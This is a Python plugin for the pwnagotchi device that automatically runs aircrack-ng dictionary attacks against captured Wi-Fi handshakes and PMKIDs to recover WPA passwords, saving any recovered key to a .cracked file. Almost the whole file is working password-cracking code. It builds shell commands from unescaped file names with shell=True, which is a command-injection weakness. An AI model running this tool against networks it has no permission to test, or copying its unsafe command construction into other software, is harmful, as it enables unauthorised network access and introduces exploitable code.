from pwnagotchi import plugins
import logging
import subprocess
import string
import re
import os

'''
Aircrack-ng needed, to install:
> apt-get install aircrack-ng
Upload wordlist files in .txt format to folder in config file (Default: /opt/wordlists/)
Cracked handshakes stored in handshake folder as [essid].pcap.cracked
'''


class QuickDic(plugins.Plugin):
    __author__ = 'silentree12th'
    __version__ = '1.2.0'
    __license__ = 'GPL3'
    __description__ = 'Run a quick dictionary scan against captured handshakes'

    

    def on_loaded(self):
        self.wordlist_folder = "/home/pi/wordlists/"
        logging.info('[quickdic] plugin loaded')

    def on_handshake(self, agent, filename, access_point, client_station):
        todelete = 0
        handshakeFound = 0
        result = subprocess.run(('/usr/bin/aircrack-ng ' + filename + ' | grep "1 handshake" | awk \'{print $2}\''),
                                shell=True, stdout=subprocess.PIPE)
        result = result.stdout.decode('utf-8').translate({ord(c): None for c in string.whitespace})
        if result:
            handshakeFound = 1
            logging.info("[DWR] contains handshake")
        if handshakeFound == 0:
            result = subprocess.run(('/usr/bin/aircrack-ng ' + filename + ' | grep "PMKID" | awk \'{print $2}\''),
                                    shell=True, stdout=subprocess.PIPE)
            result = result.stdout.decode('utf-8').translate({ord(c): None for c in string.whitespace})
            if result:
                logging.info("[DWR] contains PMKID")
            else:
                todelete = 1
        if todelete == 1:
            os.remove(filename)
        else:
            logging.info('[quickdic] Handshake confirmed')
            wordlist_path = os.path.join(self.wordlist_folder, 'cracked.txt')
            if os.path.exists(wordlist_path):
                result2 = subprocess.run(('aircrack-ng -w ' + wordlist_path + ' -l ' + filename + '.cracked -q -b ' + result + ' ' + filename + ' | grep KEY'),
                                         shell=True, stdout=subprocess.PIPE)
                result2 = result2.stdout.decode('utf-8').strip()
                logging.info('[quickdic] %s' % result2)
                if result2 != "KEY NOT FOUND":
                    key = re.search(r'\[(.*)\]', result2)
                    pwd = str(key.group(1))
                    logging.info("[quickdic] key found in cracked. checking if ap in list")
                else:
                    logging.info('[quickdic] Password not found in cracked.txt. Trying other wordlists.')
                    self.try_other_wordlists(filename, result)
            else:
                logging.warning('[quickdic] Wordlist file not found: cracked.txt')
    
    def try_other_wordlists(self, filename, handshake_result):
        wordlist_files = [f for f in os.listdir(self.wordlist_folder) if f.endswith('.txt') and f != 'cracked.txt']
        for wordlist_file in wordlist_files:
            wordlist_path = os.path.join(self.wordlist_folder, wordlist_file)
            result2 = subprocess.run(('aircrack-ng -w ' + wordlist_path + ' -l ' + filename + '.cracked -q -b ' + handshake_result + ' ' + filename + ' | grep KEY'),
                                     shell=True, stdout=subprocess.PIPE)
            result2 = result2.stdout.decode('utf-8').strip()
            logging.info('[quickdic] %s' % result2)
            if result2 != "KEY NOT FOUND":
                key = re.search(r'\[(.*)\]', result2)
                pwd = str(key.group(1))